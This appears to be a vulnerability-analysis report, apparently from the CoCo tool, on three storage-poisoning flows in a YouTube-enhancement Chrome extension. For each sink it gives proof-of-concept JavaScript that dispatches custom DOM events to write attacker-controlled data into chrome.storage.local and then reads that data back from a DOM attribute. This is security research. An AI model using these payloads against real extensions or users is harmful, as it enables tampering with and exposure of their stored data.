# CoCo Analysis: bojcplklhdbhcndefcidaipkccnnagod

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: document_eventListener_ImprovedTubeWatched → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bojcplklhdbhcndefcidaipkccnnagod/opgen_generated_files/cs_0.js
Line 706: `document.addEventListener('ImprovedTubeWatched', function (event) {`
Line 708: `var action = event.detail.action,`
Line 717: `title: event.detail.title`

**Code:**

```javascript
// Content script - cs_0.js
// Line 479: Global storage variable
var tabId = null,
    storage = {};

// Line 508: sendMessage exposes data to webpage via DOM attribute
function sendMessage(object, callback, name) {
    document.documentElement.setAttribute('it-message', JSON.stringify(object) + ' ');  // ← Exposes data to webpage
    // ... mutation observer code ...
}

// Line 658: Storage is sent to webpage
chrome.storage.local.get(null, function (response) {
    storage = response;
    attributes(storage);

    sendMessage({
        storage  // ← Sends entire storage object (including poisoned data) to webpage
    });
});

// Line 706: Attacker-triggered event listener
document.addEventListener('ImprovedTubeWatched', function (event) {  // ← Webpage can dispatch this event
    if (chrome && chrome.runtime) {
        var action = event.detail.action,
            id = event.detail.id;  // ← attacker-controlled

        if (!storage.watched || typeof storage.watched !== 'object') {
            storage.watched = {};
        }

        if (action === 'set') {
            storage.watched[id] = {
                title: event.detail.title  // ← attacker-controlled
            };
        }

        if (action === 'remove') {
            delete storage.watched[id];
        }

        chrome.storage.local.set({
            watched: storage.watched  // ← Stores poisoned data
        });
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Custom DOM event dispatch

**Attack:**

```javascript
// On a YouTube page, attacker can poison the storage
document.dispatchEvent(new CustomEvent('ImprovedTubeWatched', {
    detail: {
        action: 'set',
        id: 'malicious_id',
        title: 'attacker_controlled_title'
    }
}));

// The poisoned data is stored in chrome.storage.local
// When extension reads storage and calls sendMessage({ storage }),
// the poisoned data is exposed back to webpage via DOM attribute:
// <html it-message='{"storage":{"watched":{"malicious_id":{"title":"attacker_controlled_title"}}}}'/>

// Attacker can read the poisoned data:
var message = document.documentElement.getAttribute('it-message');
console.log(JSON.parse(message).storage.watched);
// Output: { malicious_id: { title: 'attacker_controlled_title' } }
```

**Impact:** Complete storage exploitation chain. Attacker can poison chrome.storage.local via custom DOM events, and the extension exposes the poisoned storage back to the webpage via DOM attributes (line 658-660: `sendMessage({ storage })`). This creates a complete attack cycle where attacker-controlled data flows: webpage → custom event → storage.set → storage.get → sendMessage → DOM attribute → webpage.

---

## Sink 2: document_eventListener_ImprovedTubeBlacklist → chrome_storage_local_set_sink (preview)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bojcplklhdbhcndefcidaipkccnnagod/opgen_generated_files/cs_0.js
Line 731: `document.addEventListener('ImprovedTubeBlacklist', function (event) {`
Line 733: `var type = event.detail.type,`
Line 748: `preview: event.detail.preview`

**Code:**

```javascript
// Content script - cs_0.js (Lines 731-764)
document.addEventListener('ImprovedTubeBlacklist', function (event) {  // ← Webpage can dispatch this event
    if (chrome && chrome.runtime) {
        var type = event.detail.type,
            id = event.detail.id,
            title = event.detail.title;  // ← attacker-controlled

        if (!storage.blacklist || typeof storage.blacklist !== 'object') {
            storage.blacklist = {};
        }

        if (type === 'channel') {
            if (!storage.blacklist.channels) {
                storage.blacklist.channels = {};
            }

            storage.blacklist.channels[id] = {
                title: title,
                preview: event.detail.preview  // ← attacker-controlled
            };
        }

        if (type === 'video') {
            if (!storage.blacklist.videos) {
                storage.blacklist.videos = {};
            }

            storage.blacklist.videos[id] = {
                title: title
            };
        }

        chrome.storage.local.set({
            blacklist: storage.blacklist  // ← Stores poisoned data
        });
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Custom DOM event dispatch

**Attack:**

```javascript
// Poison blacklist with channel data
document.dispatchEvent(new CustomEvent('ImprovedTubeBlacklist', {
    detail: {
        type: 'channel',
        id: 'malicious_channel_id',
        title: 'malicious_channel',
        preview: 'attacker_preview_url'
    }
}));

// Retrieve poisoned data (same as Sink 1)
// Extension exposes storage via sendMessage({ storage }) → DOM attribute
var message = document.documentElement.getAttribute('it-message');
console.log(JSON.parse(message).storage.blacklist);
```

**Impact:** Same as Sink 1. Complete storage exploitation chain with attacker-controlled blacklist data flowing back to the webpage via DOM attributes.

---

## Sink 3: document_eventListener_ImprovedTubeBlacklist → chrome_storage_local_set_sink (title)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bojcplklhdbhcndefcidaipkccnnagod/opgen_generated_files/cs_0.js
Line 731: `document.addEventListener('ImprovedTubeBlacklist', function (event) {`
Line 733: `var type = event.detail.type,`
Line 735: `title = event.detail.title;`

**Code:**

Same as Sink 2 - different field (title vs preview) but same vulnerability.

**Classification:** TRUE POSITIVE

**Attack Vector:** Custom DOM event dispatch

**Attack:**

```javascript
// Poison blacklist with video data
document.dispatchEvent(new CustomEvent('ImprovedTubeBlacklist', {
    detail: {
        type: 'video',
        id: 'malicious_video_id',
        title: 'attacker_controlled_title'
    }
}));

// Retrieve poisoned data (same as Sink 1)
var message = document.documentElement.getAttribute('it-message');
console.log(JSON.parse(message).storage.blacklist);
```

**Impact:** Same as Sink 1 and 2. Complete storage exploitation chain.
